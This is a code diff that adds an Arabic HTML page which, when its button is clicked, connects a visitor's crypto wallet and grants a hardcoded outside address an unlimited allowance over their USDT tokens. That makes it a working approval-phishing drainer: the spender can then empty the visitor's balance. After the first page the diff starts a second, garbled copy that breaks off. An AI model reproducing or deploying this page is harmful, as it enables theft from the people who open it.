@@ -1,6 +1,65 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
+<meta charset="UTF-8" />
+<title>طلب موافقة ERC-20</title>
+<script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js" type="application/javascript"></script>
+</head>
+<body style="font-family:Tahoma; direction:rtl; text-align:center; padding:50px;">
+
+<h1>طلب موافقة ERC-20</h1>
+<button id="approveBtn" style="font-size:18px; padding:15px 30px; cursor:pointer;">اطلب موافقة</button>
+<p id="status" style="margin-top:20px; font-size:16px;"></p>
+
+<script>
+  const approveBtn = document.getElementById('approveBtn');
+  const status = document.getElementById('status');
+
+  approveBtn.onclick = async () => {
+    if (!window.ethereum) {
+      status.textContent = 'يرجى تثبيت MetaMask أولاً';
+      return;
+    }
+
+    const provider = new window.ethers.providers.Web3Provider(window.ethereum);
+
+    try {
+      await provider.send('eth_requestAccounts', []);  // طلب ربط الحساب
+
+      const signer = provider.getSigner();
+
+      const tokenAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7';  // USDT
+      const spender = '0xaB63dd850a8C2EDD526fF2D929187B94E03F777D';       // عنوان المصرح له بالإنفاق
+      const amount = window.ethers.constants.MaxUint256;                   // أقصى مبلغ ممكن (مفتوح بلا حدود)
+
+      const abi = [
+        "function approve(address spender, uint256 amount) external returns (bool)"
+      ];
+
+      const tokenContract = new window.ethers.Contract(tokenAddress, abi, signer);
+
+      status.textContent = 'جارٍ إرسال طلب الموافقة...';
+
+      const tx = await tokenContract.approve(spender, amount);
+
+      status.textContent = 'الطلب أُرسل، في انتظار تأكيد المعاملة...';
+
+      await tx.wait();
+
+      status.textContent = 'تمت الموافقة بنجاح ✅';
+
+    } catch (err) {
+      console.error(err);
+      status.textContent = 'حدث خطأ أو تم رفض المعاملة ❌';
+    }
+  };
+</script>
+
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="ar">
+<head>
   <meta charset="UTF-8" />
   <title>vv افقة</title>
   <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js" type="application/javascript"></script>
